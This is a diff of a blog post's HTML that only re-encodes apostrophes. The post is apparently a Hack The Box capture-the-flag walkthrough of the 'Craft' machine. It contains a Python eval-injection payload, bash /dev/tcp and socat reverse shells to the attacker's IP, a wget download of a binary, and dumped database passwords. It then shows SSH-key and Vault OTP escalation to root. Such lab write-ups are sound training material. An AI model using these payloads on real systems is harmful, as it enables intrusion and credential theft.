@@ -8,8 +8,8 @@
   content="jivex5k">
 <meta name="description"
   content="Welcome to another Forest Hex hacking adventure! 🌲🏹
-Today I&#39;m going to exploit some poor programming decisions and leverage those into a root shell. Grab a beer and come along for the ride.
-  Port Scan As always, I start with a port scan to see what&#39;s open. I do a quick scan of all ports using nmap and then pipe those into a new, more thorough nmap scan." />
+Today I&amp;rsquo;m going to exploit some poor programming decisions and leverage those into a root shell. Grab a beer and come along for the ride.
+  Port Scan As always, I start with a port scan to see what&amp;rsquo;s open. I do a quick scan of all ports using nmap and then pipe those into a new, more thorough nmap scan." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="#252627" />
@@ -159,7 +159,7 @@ Today I&#39;m going to exploit some poor programming decisions and leverage thos
 
             <div class="post-content">
                 <p><strong>Welcome to another Forest Hex hacking adventure! 🌲🏹</strong></p>
-<p><em>Today I'm going to exploit some poor programming decisions and leverage those into a root shell. Grab a beer and come along for the ride.</em></p>
+<p><em>Today I&rsquo;m going to exploit some poor programming decisions and leverage those into a root shell. Grab a beer and come along for the ride.</em></p>
 
     <figure class="left" >
         <img src="image-8.webp"   />
@@ -170,7 +170,7 @@ Today I&#39;m going to exploit some poor programming decisions and leverage thos
 
 <hr>
 <h1 id="port-scan">Port Scan</h1>
-<p>As always, I start with a port scan to see what's open. I do a quick scan of all ports using nmap and then pipe those into a new, more thorough nmap scan.</p>
+<p>As always, I start with a port scan to see what&rsquo;s open. I do a quick scan of all ports using nmap and then pipe those into a new, more thorough nmap scan.</p>
 <p>Commands:</p>
 <p><code>ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.110 | grep [1] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) nmap -sC -sV -p $ports 10.10.10.110</code></p>
 
@@ -182,7 +182,7 @@ Today I&#39;m going to exploit some poor programming decisions and leverage thos
 
 
 <blockquote>
-<p>Editor's Note: I found out much later that this nmap procedure was redundant. The following command accomplishes the same thing:
+<p>Editor&rsquo;s Note: I found out much later that this nmap procedure was redundant. The following command accomplishes the same thing:
 <code>nmap -p- -sC -sV --min-rate=1000 -T4 &lt;ip&gt;</code></p>
 </blockquote>
 <p>Nmap found:</p>
@@ -216,7 +216,7 @@ Today I&#39;m going to exploit some poor programming decisions and leverage thos
     </figure>
 
 
-<p>I tried some basic SQL injection on the auth endpoints but couldn't find anything meaningful. I decided to check the git page to see if there were any more obvious routes to gain access.</p>
+<p>I tried some basic SQL injection on the auth endpoints but couldn&rsquo;t find anything meaningful. I decided to check the git page to see if there were any more obvious routes to gain access.</p>
 <hr>
 <h1 id="exploring-git">Exploring Git</h1>
 <p>Remember when I said never underestimate simple exploration? This is why:</p>
@@ -239,7 +239,7 @@ Today I&#39;m going to exploit some poor programming decisions and leverage thos
     </figure>
 
 
-<p>No luck, they are grabbing the data from a settings file, which is not present on the git repository. But there's still a chance the credentials were included in an older commit, so let's take a look at the commit history and see what stands out.</p>
+<p>No luck, they are grabbing the data from a settings file, which is not present on the git repository. But there&rsquo;s still a chance the credentials were included in an older commit, so let&rsquo;s take a look at the commit history and see what stands out.</p>
 
     <figure class="left" >
         <img src="image-18.webp"   />
@@ -258,7 +258,7 @@ Today I&#39;m going to exploit some poor programming decisions and leverage thos
 
 
 <p>Ah ha! Dinesh has foolishly left his credentials hardcoded into a test he created. These credentials are for the <code>/auth/login</code> endpoint of the API, and now I have a handy python script to reference for details on usage.</p>
-<p>Credentials alone won't be enough to get into the machine, but it's a start. The next step is figuring out what I can do with these credentials. Looking at the <code>issues</code> page is a good starting point.</p>
+<p>Credentials alone won&rsquo;t be enough to get into the machine, but it&rsquo;s a start. The next step is figuring out what I can do with these credentials. Looking at the <code>issues</code> page is a good starting point.</p>
 
     <figure class="left" >
         <img src="image-20.webp"   />
@@ -267,7 +267,7 @@ Today I&#39;m going to exploit some poor programming decisions and leverage thos
     </figure>
 
 
-<p>Ah, the personality in this box is awesome. Gilfoyle is taking a stab at Dinesh, completely in line with something he would do on the show. What's so bad about Dinesh's patch though?</p>
+<p>Ah, the personality in this box is awesome. Gilfoyle is taking a stab at Dinesh, completely in line with something he would do on the show. What&rsquo;s so bad about Dinesh&rsquo;s patch though?</p>
 
     <figure class="left" >
         <img src="image-21.webp"   />
@@ -278,8 +278,8 @@ Today I&#39;m going to exploit some poor programming decisions and leverage thos
 
 <p>Can you see the vulnerability?</p>
 <p><code>eval('%s &gt; 1' % request.json['abv'])</code></p>
-<p>Ah, our good pal <code>eval</code>. It's dangerous to run <code>eval</code> on user input because it will evaluate a string as a python expression. <a href="https://docs.python.org/3/library/functions.html#eval">You can read more about it here.</a></p>
-<p>Here's the entire function:</p>
+<p>Ah, our good pal <code>eval</code>. It&rsquo;s dangerous to run <code>eval</code> on user input because it will evaluate a string as a python expression. <a href="https://docs.python.org/3/library/functions.html#eval">You can read more about it here.</a></p>
+<p>Here&rsquo;s the entire function:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a6e22e">@auth.auth_required</span>
 <span style="color:#a6e22e">@api.expect</span>(beer_entry)
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post</span>(self):
@@ -303,7 +303,7 @@ Today I&#39;m going to exploit some poor programming decisions and leverage thos
 <p>So, I have to get the system to execute that command. The eval expression is:</p>
 <p><code>if eval('%s &gt; 1' % request.json['abv']):</code></p>
 <p>So, it will take whatever string I provide as the ABV when adding a new beer by sending a POST request to the <code>/brew</code> endpoint. Dinesh to the rescue again, we can use his test script to do this.</p>
-<p>Here's the script I created based on his test script:</p>
+<p>Here&rsquo;s the script I created based on his test script:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
 <span style="color:#f92672">import</span> json
 
@@ -331,13 +331,13 @@ json_data <span style="color:#f92672">=</span> json<span style="color:#f92672">.
 response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">https://api.craft.htb/api/brew/</span><span style="color:#e6db74">&#39;</span>, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>json_data, verify<span style="color:#f92672">=</span>False)
 <span style="color:#66d9ef">print</span>(response<span style="color:#f92672">.</span>text)
 </code></pre></div><p>The important part is <code>brew_dict['abv'] = '__**import__**(&quot;os&quot;).system(&quot;bash -i &gt;&amp; /dev/tcp/&lt;my_ip&gt;/44226 0&gt;&amp;1&quot;)'</code></p>
-<p>The problem with using <code>os.system()</code> in python is that it requires <code>import os</code> to be present at by the time it reaches <code>os.system()</code>, otherwise it won't know what to do. You can get around this by using the global namespace for import like I did in the line above. Definitely something new I learned figuring that out.</p>
+<p>The problem with using <code>os.system()</code> in python is that it requires <code>import os</code> to be present at by the time it reaches <code>os.system()</code>, otherwise it won&rsquo;t know what to do. You can get around this by using the global namespace for import like I did in the line above. Definitely something new I learned figuring that out.</p>
 <p>However, after several attempts I was unable to get a reverse shell. I suspected one of two things was possible:</p>
 <ol>
 <li>My formatting for the eval was wrong.</li>
 <li>The environment flask was running is was locked down.</li>
 </ol>
-<p>To rule out number one I simplified my command. I had the server attempt to download a file from my machine using wget, and while I'm having it download a file it might as well be a <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat">static socat binary</a> that I can use to get a full TTY reverse shell.</p>
+<p>To rule out number one I simplified my command. I had the server attempt to download a file from my machine using wget, and while I&rsquo;m having it download a file it might as well be a <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat">static socat binary</a> that I can use to get a full TTY reverse shell.</p>
 <p>After downloading the file, I serve it up using a simple Python command:</p>
 <p><code>python -m SimpleHTTPServer</code></p>
 
@@ -369,13 +369,13 @@ response <span style="color:#f92672">=</span> requests<span style="color:#f92672
 
 </figure>
 
-<p>Success! It's not a shell, but it's a start and confirms that I can execute commands on the machine. It's time to modify the script to have it use socat to create a reverse shell. I can do this using the following commands:</p>
+<p>Success! It&rsquo;s not a shell, but it&rsquo;s a start and confirms that I can execute commands on the machine. It&rsquo;s time to modify the script to have it use socat to create a reverse shell. I can do this using the following commands:</p>
 <p>Listener: <code>socat file:$(tty),raw,echo=0 tcp-listen:44226</code></p>
 <p>Victim: <code>socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:44226</code></p>
 <p>A couple of things:</p>
 <ol>
 <li>The socat file on the victim needs to have execute permissions added.</li>
-<li>The command to connect via socat also needs to be modified since it's using quotes, and the newly downloaded socat isn't in PATH.</li>
+<li>The command to connect via socat also needs to be modified since it&rsquo;s using quotes, and the newly downloaded socat isn&rsquo;t in PATH.</li>
 </ol>
 <p>To solve those issues I added a chmod +x command, escaped the quotes, and added a ./ in front of the socat so linux knows to look in the current folder for it. The end result is this:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">brew_dict[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">abv</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__import__(</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">os</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">).system(</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">chmod +x socat; ./socat exec:</span><span style="color:#e6db74">&#39;</span>sh <span style="color:#f92672">-</span>li<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">,pty,stderr,setsid,sigint,sane tcp:10.10.14.15:44226</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">)</span><span style="color:#e6db74">&#39;</span>
@@ -397,10 +397,10 @@ response <span style="color:#f92672">=</span> requests<span style="color:#f92672
 
 </figure>
 
-<p>Success! But&hellip; wait&hellip; I'm root? Hmmm&hellip; that seemed very suspicious to me. I started poking around and found:</p>
+<p>Success! But&hellip; wait&hellip; I&rsquo;m root? Hmmm&hellip; that seemed very suspicious to me. I started poking around and found:</p>
 <ol>
-<li>My socat binary didn't work, has a syntax error.</li>
-<li>I'm not really root, this is stuck in a busybox shell.</li>
+<li>My socat binary didn&rsquo;t work, has a syntax error.</li>
+<li>I&rsquo;m not really root, this is stuck in a busybox shell.</li>
 <li>It looks like we are in a docker environment.</li>
 </ol>
 <p>I also found a juicy settings file that contains DB credentials, and a secret key used to generate valid tokens from username + timestamp. This means I can generate a token for any user without the password.</p>
@@ -430,9 +430,9 @@ MYSQL_DATABASE_HOST <span style="color:#f92672">=</span> <span style="color:#e6d
 SQLALCHEMY_TRACK_MODIFICATIONS <span style="color:#f92672">=</span> False
 </code></pre></div><p>Just look at all those juicy secrets! An inspection of the environment variables reveals something interesting as well:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">GPG_KEY<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D&#39;</span>
-</code></pre></div><p>Searching this key reveals that it's part of a python 3.6 docker instance. Hmmm, I need to escape this docker instance somehow. I have doubts that it will be via an exploit, rather it will probably involve the found credentials and API key.</p>
-<p>So let's see if we can access the database. I can modify the DB test script to do this since the database is only available internally. I could also set up a proxy and use a mySQL client, but the python is already set up to work so I'm going to take the path of least resistance here.</p>
-<p>Here's my modified DBTest script:</p>
+</code></pre></div><p>Searching this key reveals that it&rsquo;s part of a python 3.6 docker instance. Hmmm, I need to escape this docker instance somehow. I have doubts that it will be via an exploit, rather it will probably involve the found credentials and API key.</p>
+<p>So let&rsquo;s see if we can access the database. I can modify the DB test script to do this since the database is only available internally. I could also set up a proxy and use a mySQL client, but the python is already set up to work so I&rsquo;m going to take the path of least resistance here.</p>
+<p>Here&rsquo;s my modified DBTest script:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
 
 <span style="color:#f92672">import</span> pymysql
@@ -455,10 +455,10 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 
 <span style="color:#66d9ef">finally</span>:
     connection<span style="color:#f92672">.</span>close()
-</code></pre></div><p>I've modified it to use fetch_all instead of fetch_one, and can execute any SQL command I want. First I <code>show databases</code>, and see that it's only <code>craft</code> and <code>information_schema</code>. The db= in the connection string resolves to <code>craft</code>, so I can do a <code>show tables</code> command to see what's in there.</p>
-<p>Looks like it's only two tables, <code>craft</code> which contains the beer info, and <code>user</code> which contains the username and passwords for generating API tokens. I can then do <code>select * from user</code> to get it all:</p>
+</code></pre></div><p>I&rsquo;ve modified it to use fetch_all instead of fetch_one, and can execute any SQL command I want. First I <code>show databases</code>, and see that it&rsquo;s only <code>craft</code> and <code>information_schema</code>. The db= in the connection string resolves to <code>craft</code>, so I can do a <code>show tables</code> command to see what&rsquo;s in there.</p>
+<p>Looks like it&rsquo;s only two tables, <code>craft</code> which contains the beer info, and <code>user</code> which contains the username and passwords for generating API tokens. I can then do <code>select * from user</code> to get it all:</p>
 <p><code>[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]</code></p>
-<p>And there we have it. Granted it's just for generating an API token, but maybe someone has reused one of their passwords.</p>
+<p>And there we have it. Granted it&rsquo;s just for generating an API token, but maybe someone has reused one of their passwords.</p>
 <p>No luck with SSH. I tried both port 22, and 6022 but was denied in both. They might work in gogs however.</p>
 
     <figure class="left" >
@@ -477,8 +477,8 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
     </figure>
 
 
-<p>Well&hellip; hmmm&hellip; Time for some more research. I found a commit that disabled the vault UI, it looks like there's a listener at port 8200 though. More digging&hellip;.</p>
-<p>Well&hellip; What's this??</p>
+<p>Well&hellip; hmmm&hellip; Time for some more research. I found a commit that disabled the vault UI, it looks like there&rsquo;s a listener at port 8200 though. More digging&hellip;.</p>
+<p>Well&hellip; What&rsquo;s this??</p>
 
     <figure class="left" >
         <img src="1578158745.webp"   />
@@ -487,7 +487,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
     </figure>
 
 
-<p>An OpenSSH private key on his private git. Why hello there darlin&rsquo;, let's take you out for a spin. I copied the key into a new file with nano, saved and modified the permissions (ssh requires this to work), then attempted to log in via ssh:</p>
+<p>An OpenSSH private key on his private git. Why hello there darlin&rsquo;, let&rsquo;s take you out for a spin. I copied the key into a new file with nano, saved and modified the permissions (ssh requires this to work), then attempted to log in via ssh:</p>
 <p><code>root@wks104:~/craft# chmod 600 gilfoyle.keyroot@wks104:~/craft# ssh gilfoyle@craft.htb -i gilfoyle.key</code></p>
 
     <figure class="left" >
@@ -505,11 +505,11 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 
 </figure>
 
-<p>There's the user flag. I was almost stymied at the required passphrase on the key, but the same password Gilfoyle used for git was used here! For shame&hellip; for as much smack as Gilfoyle talks on Dinesh, he has reused his password in three places here.</p>
-<p>Now that we have a solid foothold it's time to escalate our priveleges.</p>
+<p>There&rsquo;s the user flag. I was almost stymied at the required passphrase on the key, but the same password Gilfoyle used for git was used here! For shame&hellip; for as much smack as Gilfoyle talks on Dinesh, he has reused his password in three places here.</p>
+<p>Now that we have a solid foothold it&rsquo;s time to escalate our priveleges.</p>
 <hr>
 <h1 id="gaining-root-access">Gaining Root Access</h1>
-<p>The first thing I do when attempting privelege escalation is to check the sudoers file. Actually, I lied, the first thing I do is check the shell I'm in to see if it's restricted. This is accomplished via: <code>echo $0</code></p>
+<p>The first thing I do when attempting privelege escalation is to check the sudoers file. Actually, I lied, the first thing I do is check the shell I&rsquo;m in to see if it&rsquo;s restricted. This is accomplished via: <code>echo $0</code></p>
 <p>Looks like this one has bash:</p>
 
     <figure class="left" >
@@ -530,7 +530,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
     </figure>
 
 
-<p>No sudo on this machine. Now normally I would proceed to use both LinuxEnum.sh and linuxprivchecker.py, but something stuck out when I was trifling through Gilfoyle's git branch.</p>
+<p>No sudo on this machine. Now normally I would proceed to use both LinuxEnum.sh and linuxprivchecker.py, but something stuck out when I was trifling through Gilfoyle&rsquo;s git branch.</p>
 
     <figure class="left" >
         <img src="image-91.webp"   />
@@ -540,7 +540,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 
 
 <p>This script looks like it enables some form of OTP for root access via SSH. I did some googling and found out more:</p>
-<p>It's a program called <a href="https://www.vaultproject.io/">Vault</a> by Hashicorp. It's a server which handles secret management that serves up access over HTTP, and a local client as well. I went through the tutorial and started looking for secrets.</p>
+<p>It&rsquo;s a program called <a href="https://www.vaultproject.io/">Vault</a> by Hashicorp. It&rsquo;s a server which handles secret management that serves up access over HTTP, and a local client as well. I went through the tutorial and started looking for secrets.</p>
 <p>Vault was indeed installed and running on the machine, the command line interface worked just fine. I attempted to find anything at all in the data storage of the program:</p>
 <p><code>vault secrets list</code></p>
 
@@ -569,7 +569,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 <p><a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html">https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html</a></p>
 <p>It explained the process a bit more, and gave a nice one-liner to use</p>
 <p><code>vault ssh -role otp_key_role -mode otp username@x.x.x.x</code></p>
-<p>I know from Gilfoyle's git page the SSH OTP is enabled, and the role is root_otp. I filled in the blanks and executed the command:</p>
+<p>I know from Gilfoyle&rsquo;s git page the SSH OTP is enabled, and the role is root_otp. I filled in the blanks and executed the command:</p>
 <p><code>vault ssh -role root_otp -mode otp root@localhost</code></p>
 
     <figure class="left" >
